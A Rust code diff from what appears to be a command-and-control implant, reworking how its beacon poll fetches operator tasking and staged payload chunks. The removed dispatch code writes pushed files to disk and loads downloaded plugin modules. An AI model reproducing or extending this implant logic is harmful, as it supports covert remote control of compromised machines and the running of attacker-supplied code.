@@ -4,17 +4,18 @@ use prost::Message;
 
 use super::{accept_tasking, Contact};
 use crate::error::ContactError;
-use crate::handlers::Outcome;
 use crate::profile::Profile;
 use crate::session::{Attempt, Session};
-use crate::wire::{Frame, StagedChunk, TaskRequest};
+use crate::wire::{Frame, StagedChunk};
 
 /// The envelope POST cycle (architecture.md Sec 8): one POST to
 /// /implants/beacon is one poll contact. The request body carries the
-/// handshake plus the accumulated batch; the response carries the handshake
-/// answer, the staged chunk runs answering this cycle's demands, then queued
-/// tasking. The batch leaves only after a processed response, so a failed
-/// POST re-sends it verbatim.
+/// handshake, the staged demands at their current seams, and the accumulated
+/// batch; the response carries the handshake answer, the staged chunk runs
+/// answering those demands, then queued tasking. The batch leaves only after
+/// a processed response, so a failed POST re-sends it verbatim; a staged
+/// transfer's held bytes survive the failure on the session, so its next
+/// demand resumes instead of restarting.
 pub struct Poll {
     url: String,
     agent: ureq::Agent,
@@ -34,10 +35,11 @@ impl Contact for Poll {
         // Channel output produced since the last cycle rides this request --
         // the poll discipline's delivery edge.
         session.drain_channels();
-        let demands = session.outbox.take_demands();
+        let demands = session.staged_demands();
         let batch = session.outbox.batch();
-        let mut frames = Vec::with_capacity(1 + batch.len());
+        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len());
         frames.push(session.handshake_frame());
+        frames.extend(demands);
         frames.extend(batch.iter().cloned());
         let (body, content_type) = session.encode_outgoing(&frames);
 
@@ -73,114 +75,24 @@ impl Contact for Poll {
         // The batch crossed: its frames are delivered, and this cycle's
         // demands are answered below.
         session.outbox.batch_crossed(batch.len());
-        accept_staged(session, &inbound, &demands);
+        accept_staged(session, &inbound);
         accept_tasking(session, &inbound[1..], acks);
         // Echoes the channel input just routed may already have produced
         // output; it queues now and rides the next cycle.
         session.drain_channels();
+        session.staged_cycle_end();
         Ok(Attempt::Crossed)
     }
 }
 
-/// The staged half of a poll response: each demand's chunk run,
-/// terminal-flagged, in demand order (the server answers demands before new
-/// tasking). A run that never terminates fails the task -- the operator sees
-/// the cause on the task itself.
-pub fn accept_staged(session: &mut Session, inbound: &[Frame], demands: &[TaskRequest]) {
-    let mut index = 1;
-    for task in demands {
-        let mut payload: Vec<u8> = Vec::new();
-        let mut terminal = false;
-        while index < inbound.len() && !terminal {
-            let Ok(chunk) = StagedChunk::decode(inbound[index].payload.as_ref()) else {
-                break;
-            };
-            if chunk.task_id != task.task_id {
-                break;
-            }
-            index += 1;
-            payload.extend_from_slice(&chunk.data);
-            terminal = chunk.terminal;
+/// The staged half of a poll response: every chunk run the response carries,
+/// routed by task id into the session's transfer state -- placement, resume
+/// bookkeeping, and the terminal dispatch live there, shared with every
+/// other carriage (ADR-010).
+pub fn accept_staged(session: &mut Session, inbound: &[Frame]) {
+    for frame in inbound.iter().skip(1) {
+        if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
+            session.accept_staged_chunk(&chunk);
         }
-        if !terminal {
-            session.outbox.result(
-                &task.task_id,
-                Outcome::Failed,
-                "staged payload stream ended without a terminal chunk",
-            );
-            continue;
-        }
-        let (outcome, output) = dispatch_staged(session, &task.verb, &task.arguments, &payload);
-        session.outbox.result(&task.task_id, outcome, &output);
-    }
-}
-
-/// The staged dispatch arm: the payload arrived, the arguments carry the
-/// grammar. file.push lands bytes on disk; module.load hands them to the
-/// plugin loader (architecture.md Sec 5.4). Anything else fails with the
-/// grammar named.
-pub fn dispatch_staged(
-    session: &mut Session,
-    verb: &str,
-    arguments: &str,
-    payload: &[u8],
-) -> (Outcome, String) {
-    use sha2::{Digest, Sha256};
-    let Some(space) = arguments.rfind(' ') else {
-        return (
-            Outcome::Failed,
-            format!("{verb} staged expects '<...> sha256:<hex>'"),
-        );
-    };
-    let head = arguments[..space].trim();
-    let Some(expected) = arguments[space + 1..].trim().strip_prefix("sha256:") else {
-        return (
-            Outcome::Failed,
-            format!("{verb} staged expects '<...> sha256:<hex>'"),
-        );
-    };
-    let actual: String = Sha256::digest(payload)
-        .iter()
-        .map(|b| format!("{b:02x}"))
-        .collect();
-    if !actual.eq_ignore_ascii_case(expected) {
-        return (
-            Outcome::Failed,
-            format!("{verb} staged: payload hash mismatch: expected {expected}, received {actual}"),
-        );
-    }
-    if verb == "module.load" {
-        let name = head.trim();
-        if name.is_empty() {
-            return (
-                Outcome::Failed,
-                "module.load staged expects '<name> sha256:<hex>'".into(),
-            );
-        }
-        return match session.plugins.load(name, payload, expected) {
-            Ok(report) => {
-                // The routes widened: the next contact advertises them.
-                session.sync_module_advertisements();
-                (Outcome::Succeeded, report)
-            }
-            Err(cause) => (Outcome::Failed, cause),
-        };
-    }
-    if verb != "file.push" {
-        return (
-            Outcome::Failed,
-            format!("{verb}: this build carries no staged handler for the verb"),
-        );
-    }
-    let path = head;
-    if let Some(parent) = std::path::Path::new(path).parent() {
-        let _ = std::fs::create_dir_all(parent);
-    }
-    match std::fs::write(path, payload) {
-        Ok(()) => (
-            Outcome::Succeeded,
-            format!("{path}: {} bytes written", payload.len()),
-        ),
-        Err(err) => (Outcome::Failed, format!("write {path}: {err}")),
     }
 }
